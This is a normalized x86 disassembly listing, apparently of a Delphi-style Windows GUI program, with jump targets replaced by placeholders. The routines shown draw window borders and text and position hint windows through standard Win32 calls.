jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_447b55
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44777c
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4418f4
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_447b94
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_442778
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_44020c
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_447bdc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442998
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_447c0c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_4473c8
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_443924
xor ecx ecx
push ebp
push sub_447d3b
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_443dbc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_443dbc
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447d42
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44392c
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_443d80
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_447d42
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403418
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403418
jmp r-xdata
sub_447dd8
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_441a58
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_441a58
sub_447e1c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_441a58
sub_447e6c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_447efc
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_448162
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_4236b8
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_432154
call sub_432234
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_432154
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_43284c
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_4481a4
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cd4
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_4403e8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_444978
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_441a58
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_442c1c
sub_448210
push ebx
push esi
mov esi edx
call sub_4576d8
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406c68
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_441a58
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406c68
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_441a58
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_448274
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_444d40
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4482ac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4482a4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4482ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43f9a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4237d4
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_43f480
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_448348
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_40321c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43fa7c
test bl bl
jle r-xdata
xor eax eax
call sub_43da74
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_448388
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_423ad8
xor eax eax
push ebp
push sub_448423
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_423e4c
xor eax eax
push ebp
push sub_448400
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448407
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_423e4c
retn
sub_448434
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448d28
mov edx 0x80ffff
mov eax esi
call sub_440a44
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_423cec
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_4237a0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4484a0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_443f18
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c13c
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_443eb0
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_44850c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_448562
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448569
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call ReleaseDC
retn
sub_448570
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_448609
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_422eb8
mov eax ebx
call sub_442bc4
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4408a4
mov eax [ ebp - 0x14 ]
call sub_40442c
push eax
mov eax [ ebx + 0x208 ]
call sub_423dcc
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448610
lea eax [ ebp - 0x14 ]
call sub_403f6c
retn
sub_448618
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_448684
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_44870f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448716
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4408a4
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_423c2c
mov edx eax
add edx 0x6
mov eax esi
call sub_440060
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4408a4
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_423c48
mov edx eax
add edx 0x4
mov eax esi
call sub_440084
sub_44871c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_4488f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4408d4
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_441afc
mov eax [ esi ]
call sub_45df10
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45df1c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45df10
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_45df04
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_45df1c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_45def8
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_45df04
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_45def8
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4447c0
push 0x4
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4488fc
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_40422c
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_44b970
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call [ rw-data ]
sub_448904
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44892c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_418d68
mov eax esi
call sub_442bc4
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ esi + 0x208 ]
call sub_423dcc
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_448988
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_418d68
call sub_432154
call sub_432234
test al al
jne r-xdata
call sub_432154
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_4324c0
push esp
push 0x1
push 0xf
push 0x0
call sub_432154
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_4322a4
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_4489f4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_4450c8
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_448a18
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_448a58
push ebp
mov ebp esp
